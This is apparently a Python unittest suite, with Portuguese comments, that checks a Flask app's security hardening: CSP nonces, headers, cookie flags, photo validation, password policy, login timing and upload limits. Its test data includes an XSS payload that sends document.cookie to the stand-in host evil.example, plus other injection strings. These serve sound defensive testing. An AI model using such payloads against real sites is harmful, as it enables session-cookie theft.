"""Endurecimento de segurança: CSP, cabeçalhos, foto de perfil, senhas, login e uploads."""
import re
import unittest
from io import BytesIO
from unittest import mock

from backend.app import create_app
from backend.passwords import validate_password
from backend.permissions import safe_photo
from backend.tests import test_api

VALID_PHOTO = 'data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAMCAgMCAgMDAwMEAwMEBQgFBQQEBQoHBwYIDAoMDAsKCwsNDhIQDQ4RDgsLEBYQERMUFRUVDA8XGBYUGBIUFRT='
EVIL_PHOTO = 'x" onerror="fetch(`//evil.example/`+document.cookie)'


ISOLATED = dict(TESTING=True, SECRET_KEY='x' * 40, ALLOW_LOCAL_FRAME_PREVIEW=False, PUBLIC_ORIGIN='', LIVEKIT_URL='',
                SESSION_COOKIE_SECURE=False, TRUSTED_PROXY_COUNT=0, ALLOW_REGISTRATION=True,
                LIVEKIT_API_KEY='', LIVEKIT_API_SECRET='')


class SecurityHardeningTests(unittest.TestCase):
    # Reaproveita só os utilitários da suíte da API, sem herdar (e repetir) os testes dela.
    setUpClass = classmethod(test_api.ApiTests.setUpClass.__func__)
    write = test_api.ApiTests.write
    login = test_api.ApiTests.login

    def build(self, **extra):
        """Cria o app sem herdar valores do .env real de quem está rodando os testes."""
        return create_app({**ISOLATED, 'STORAGE_DIR': self.folder.name, **extra}, self.database)

    def setUp(self):
        test_api.ApiTests.setUp(self)
        self.app = self.build()
        self.client = self.app.test_client()
        self.csrf = self.client.get('/api/session').json['csrf']

    def test_index_has_strict_csp_with_a_fresh_nonce_per_response(self):
        first, second = self.client.get('/'), self.client.get('/')
        policies = [response.headers['Content-Security-Policy'] for response in (first, second)]
        nonces = [re.search(r"'nonce-([^']+)'", policy).group(1) for policy in policies]
        self.assertNotEqual(*nonces)
        for response, policy, nonce in zip((first, second), policies, nonces):
            script_src = re.search(r'script-src ([^;]+)', policy).group(1)
            self.assertNotIn("'unsafe-inline'", script_src)
            self.assertNotIn("'unsafe-eval'", script_src)
            for required in ("object-src 'none'", "base-uri 'none'", "form-action 'self'", "frame-ancestors 'self'"):
                self.assertIn(required, policy)
            self.assertIn(f'<script type="module" nonce="{nonce}">', response.get_data(as_text=True))
            self.assertEqual(response.headers['Cache-Control'], 'no-store')

    def test_csp_allows_only_the_configured_voice_server(self):
        app = self.build(LIVEKIT_URL='wss://voz.exemplo.br')
        policy = app.test_client().get('/').headers['Content-Security-Policy']
        connect = re.search(r'connect-src ([^;]+)', policy).group(1)
        self.assertEqual(set(connect.split()), {"'self'", 'wss://voz.exemplo.br', 'https://voz.exemplo.br'})

    def test_reset_page_and_api_have_their_own_policies(self):
        page = self.client.get('/reset-password')
        self.assertEqual(page.status_code, 302)
        self.assertEqual(page.headers['Location'], '/')
        self.assertNotIn('nonce-', page.headers['Content-Security-Policy'])
        self.assertNotIn('unsafe-inline', re.search(r'script-src ([^;]+)', page.headers['Content-Security-Policy']).group(1))
        api = self.client.get('/api/session')
        self.assertEqual(api.headers['Content-Security-Policy'], "default-src 'none'; frame-ancestors 'self'")
        for name, value in {'X-Content-Type-Options': 'nosniff', 'Cross-Origin-Opener-Policy': 'same-origin',
                            'Cross-Origin-Resource-Policy': 'same-origin', 'Cache-Control': 'no-store'}.items():
            self.assertEqual(api.headers[name], value)
        self.assertIn('geolocation=()', api.headers['Permissions-Policy'])

    def test_https_deployment_gets_hsts_and_host_prefixed_cookie(self):
        app = self.build(SESSION_COOKIE_SECURE=True,
                              PUBLIC_ORIGIN='https://hub.exemplo.br')
        response = app.test_client().get('/api/session', base_url='https://hub.exemplo.br')
        self.assertIn('max-age=31536000', response.headers['Strict-Transport-Security'])
        cookie = response.headers['Set-Cookie']
        self.assertTrue(cookie.startswith('__Host-labiomec_session='))
        self.assertIn('Secure', cookie)
        self.assertIn('HttpOnly', cookie)
        self.assertIn('upgrade-insecure-requests', app.test_client().get('/', base_url='https://hub.exemplo.br').headers['Content-Security-Policy'])
        self.assertNotIn('Strict-Transport-Security', self.client.get('/api/session').headers)

    def test_proxy_headers_are_only_trusted_when_configured(self):
        def client_ip(count):
            app = self.build(TRUSTED_PROXY_COUNT=count)
            seen = {}
            @app.get('/ip')
            def ip():
                from flask import request
                seen['ip'] = request.remote_addr
                return 'ok'
            app.test_client().get('/ip', headers={'X-Forwarded-For': '203.0.113.9'})
            return seen['ip']
        self.assertEqual(client_ip(0), '127.0.0.1')
        self.assertEqual(client_ip(1), '203.0.113.9')

    def test_profile_photo_must_be_an_embedded_image(self):
        self.login()
        for bad in (EVIL_PHOTO, 'https://evil.example/x.png', 'data:image/svg+xml;base64,PHN2Zz4=', 'javascript:alert(1)',
                    VALID_PHOTO + '" onerror="x', 'data:image/png;base64,' + 'A' * 1_600_000, 5):
            with self.subTest(photo=str(bad)[:40]):
                self.assertEqual(self.write('/api/data/users/alice', {'photo': bad}).status_code, 400)
        self.assertEqual(self.write('/api/data/users/alice', {'photo': VALID_PHOTO}).status_code, 200)
        self.assertEqual(self.write('/api/data/users/alice', {'photo': None}).status_code, 200)

    def test_previously_stored_malicious_photos_are_not_served_to_other_people(self):
        self.database.accounts['bob']['profile']['photo'] = EVIL_PHOTO
        self.database.accounts['carol']['profile']['photo'] = VALID_PHOTO
        self.login()
        self.assertFalse(self.client.get('/api/data/users/bob').json['data'].get('photo'))
        self.assertEqual(self.client.get('/api/data/users/carol').json['data']['photo'], VALID_PHOTO)
        self.assertIsNone(safe_photo(EVIL_PHOTO))

    def test_document_paths_cannot_carry_markup_breaking_characters(self):
        self.login()
        for path in ('posts/a%22%20onmouseover%3D%22x', 'posts/%3Cimg%3E', 'posts/a%27b', 'posts/a%60b'):
            with self.subTest(path=path):
                self.assertEqual(self.write('/api/data/' + path, {'text': 'oi'}).status_code, 400)

    def test_sync_rejects_non_object_bodies_without_a_server_error(self):
        self.login()
        for body in ([], 'texto', 7):
            with self.subTest(body=body):
                self.assertEqual(self.write('/api/sync', body, 'POST').status_code, 400)

    def test_weak_passwords_are_refused_on_registration(self):
        before = len(self.database.accounts)
        for password in ('Laboratorio2026!', 'xxxxxxxxxxxx', '123456789012', 'qwertyuiopasdf', 'ana-souza-2026-ok'):
            with self.subTest(password=password):
                response = self.write('/api/auth/register', {'email': 'ana.souza@example.org', 'password': password}, 'POST')
                self.assertEqual(response.status_code, 400)
                self.assertEqual(response.json['code'], 'auth/weak-password')
        self.assertEqual(len(self.database.accounts), before)
        ok = self.write('/api/auth/register', {'email': 'ana.souza@example.org', 'password': 'Meu gato azul dorme 3 vezes'}, 'POST')
        self.assertEqual(ok.status_code, 200)

    def test_password_policy_function(self):
        self.assertIsNone(validate_password('correct horse battery staple'))
        self.assertIn('12', validate_password('curta'))
        self.assertIn('e-mail', validate_password('maria-silva-2026', 'maria.silva@x.org'))
        self.assertIn('256', validate_password('a1B2' * 100))

    def test_unknown_and_removed_accounts_cost_the_same_hash_check_as_real_ones(self):
        self.database.accounts['carol']['profile']['isRemoved'] = True
        for email in ('ninguem@example.org', 'carol@example.org', 'alice@example.org'):
            with self.subTest(email=email), mock.patch('backend.app.check_password_hash', return_value=False) as check:
                response = self.write('/api/auth/login', {'email': email, 'password': 'senha-errada-qualquer'}, 'POST')
                self.assertEqual(response.status_code, 401)
                self.assertEqual(response.json['code'], 'auth/invalid-credential')
                self.assertEqual(check.call_count, 1)

    def test_failed_logins_are_logged_without_the_plain_email(self):
        with self.assertLogs('backend.app', level='WARNING') as logs:
            self.write('/api/auth/login', {'email': 'alice@example.org', 'password': 'senha-errada-qualquer'}, 'POST')
        text = '\n'.join(logs.output)
        self.assertIn('login recusado', text)
        self.assertNotIn('alice', text)

    def test_upload_flood_is_limited_per_user(self):
        app = self.build(UPLOADS_PER_HOUR=2)
        self.client = app.test_client()
        self.csrf = self.client.get('/api/session').json['csrf']
        self.login()
        statuses = [self.client.post('/api/files', data={'file': (BytesIO(b'x'), f'{i}.csv')},
                                     headers={'X-CSRF-Token': self.csrf}).status_code for i in range(3)]
        self.assertEqual(statuses, [201, 201, 429])
        self.login('bob')
        self.assertEqual(self.client.post('/api/files', data={'file': (BytesIO(b'x'), 'b.csv')},
                                          headers={'X-CSRF-Token': self.csrf}).status_code, 201)

if __name__ == '__main__':
    unittest.main()


@unittest.skipUnless(__import__('os').environ.get('TEST_DATABASE_URL'), 'TEST_DATABASE_URL não configurada')
class PostgresRateLimitTests(unittest.TestCase):
    def test_limit_and_window_are_configurable_and_reset_after_the_window(self):
        import os
        from uuid import uuid4
        from backend.database import Database
        database = Database(os.environ['TEST_DATABASE_URL'])
        database.initialize()
        key = 'teste-' + uuid4().hex
        with database.transaction() as repository:
            self.assertEqual([repository.attempt_allowed(key, limit=2, window_seconds=3600) for _ in range(3)], [True, True, False])
            # Padrão antigo preservado: 15 tentativas em 15 minutos.
            other = 'teste-' + uuid4().hex
            self.assertEqual([repository.attempt_allowed(other) for _ in range(16)], [True] * 15 + [False])
            # Passada a janela, o contador recomeça.
            repository.connection.execute("UPDATE login_attempts SET started_at = now() - interval '2 hours' WHERE key = %s", (key,))
            self.assertTrue(repository.attempt_allowed(key, limit=2, window_seconds=3600))
            # Uma janela mais longa ainda não expirou para a chave "other" (iniciada agora).
            self.assertFalse(repository.attempt_allowed(other, window_seconds=86400))
